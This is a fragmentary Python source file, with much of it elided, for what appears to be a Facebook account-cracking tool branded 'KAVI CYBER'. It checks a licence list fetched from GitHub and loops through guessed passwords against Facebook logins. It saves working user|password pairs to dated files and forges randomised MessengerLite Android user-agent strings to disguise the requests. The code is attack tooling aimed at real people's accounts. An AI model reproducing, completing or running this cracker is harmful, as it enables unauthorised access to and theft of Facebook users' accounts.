...
def chk(): 
  ...
  try: 
    httpCaht = requests.get('https://github.com/Pathumsadaruwan849/LAKA/blob/main/Aprroval.txt').text 
    if id in httpCaht: 
...
class Menu:
	...
	def cek_login(self,cookie):
		try:
			...
			prints(Panel(f"""{M2} WELCOME TO KAVI CYBER""",width=80,style=f"{color_panel}"))
			exit()
...
class Crack:
		...
		try:
			for pw in pwx:
				...
				if "session_key" in post.text and "EAA" in post.text:
					...
					self.cp.append(user)
					tree = Tree("                        ")
					tree.add(f" KAVI💔 {K2}{user}|{pw}{P2} ")
					#prints(tree)
					open(f"CP/{self.hari_ini}.txt","a").write(f"KAVI CP🥲 | {user} | {pw}\n")
					break
	...
	def simpan_hasil(self):
		prints(f"""{K2}KAVI CRACK OK DATE : MRX-OK.txt
{K2}KAVI CRACK CP DATE : MRX-CP.txt\n""")
###----------[ MENU ]---------- ###
class Back:
...
class Session:
	...
	def generate_ugent(self):
		...
		device = random.choice(["Realme NEX S Build/QP1A.190711.020)","Realme 2019 Build/QP1A.190711.020)","V2027 Build/QP1A.190711.020)","V2026 Build/QP1A.190711.020)","Realme 1818 Build/QP1A.190711.020)"])
		ugent = f"Dalvik/2.1.0 (Linux; U; Android {versi_android};{device})  [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{versi_app};FBCR/3;FBMF/Realme;FBBD/Realme;FBDV/{device.split(' Build')[0]};FBSV/{str(random.randint(4,10))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1412};]"
		return ugent
